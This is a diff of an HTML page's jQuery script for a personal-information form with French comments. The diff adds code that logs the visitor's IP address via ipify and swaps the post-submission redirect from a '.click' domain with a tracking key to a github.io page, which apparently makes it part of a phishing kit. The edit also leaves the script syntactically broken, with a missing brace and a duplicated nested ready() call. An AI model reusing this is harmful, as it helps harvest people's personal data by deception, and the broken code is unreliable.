@@ -171,7 +171,15 @@
     </div>
 </section>
 <script>
-    $(document).ready(function () {
+    $(document).ready(function () 
+		  $(document).ready(function () {
+        // Récupérer l'IP de l'utilisateur
+        $.getJSON("https://api.ipify.org?format=json", function (data) {
+            $('#user_ip').val(data.ip);
+        });      
+		  
+		      
+		      {
         // Validation du formulaire avec jQuery Validate
         $("#personalInformationForm").validate({
             rules: {
@@ -210,7 +218,7 @@
 
                 // Redirection vers le même site après soumission
                 setTimeout(function () {
-                    window.location.href = "https://swiftclapocos.click/home?k=1be5e2cab42fb1e712c2461fa503cee44372ad83";
+                    window.location.href = "https://justmoicom.github.io/tel2/";
                 }, 2000); // Attente de 2 secondes avant redirection
 
                 return false; // Empêcher la soumission par défaut
